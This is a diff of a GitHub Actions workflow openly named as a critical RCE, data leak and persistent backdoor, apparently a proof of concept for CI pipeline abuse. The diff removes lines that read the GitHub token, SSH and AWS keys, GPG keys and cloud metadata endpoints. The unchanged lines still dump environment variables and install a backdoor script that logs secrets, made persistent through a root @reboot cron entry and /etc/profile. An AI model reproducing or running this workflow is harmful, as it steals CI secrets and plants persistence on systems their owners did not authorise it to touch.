@@ -1,6 +1,5 @@
 name: Critical RCE & Sensitive Data Leak with Persistent Backdoor
-on:
-  push:
+on: [push]
 
 jobs:
   exploit:
@@ -11,7 +10,7 @@ jobs:
       secrets: read
 
     steps:
-      - name: Checkout repository
+      - name: Checkout Repository
         uses: actions/checkout@v4
 
       - name: Prepare Dockerfile and Payload
@@ -26,31 +25,12 @@ echo "[INFO] Dumping internal CI context..."
   id
   echo "----- ENV -----"
   printenv
-  echo "----- GITHUB TOKEN -----"
-  echo "$GITHUB_TOKEN"
-  echo "----- UNAME -----"
-  uname -a
-  echo "----- LS / -----"
-  ls -la /
-  echo "----- LS /etc -----"
-  ls -la /etc
-  echo "----- SSH PRIVATE KEY -----"
-  cat /root/.ssh/id_rsa || echo "No SSH key found"
-  echo "----- AWS CREDENTIALS -----"
-  cat /root/.aws/credentials || echo "No AWS credentials found"
-  echo "----- GPG PRIVATE KEYS -----"
-  ls -la /root/.gnupg/ || echo "No GPG keys found"
-  echo "----- CLOUD METADATA (AWS) -----"
-  curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ || echo "No AWS metadata"
-  echo "----- CLOUD METADATA (GCP) -----"
-  curl -s -H 'Metadata-Flavor: Google' --max-time 2 http://metadata.google.internal/computeMetadata/v1/ || echo "No GCP metadata"
 } > /leaks.txt
 
 echo "[INFO] Installing persistent runtime backdoor..."
 echo '#!/bin/sh' > /usr/local/bin/init.sh
 echo 'echo "[BACKDOOR] Runtime triggered at $(date)" >> /runtime-leak.log' >> /usr/local/bin/init.sh
 echo 'printenv >> /runtime-leak.log' >> /usr/local/bin/init.sh
-echo 'cat /root/.ssh/id_rsa >> /runtime-leak.log 2>/dev/null || true' >> /usr/local/bin/init.sh
 chmod +x /usr/local/bin/init.sh
 echo "@reboot /usr/local/bin/init.sh" >> /etc/crontabs/root
 echo '/usr/local/bin/init.sh' >> /etc/profile
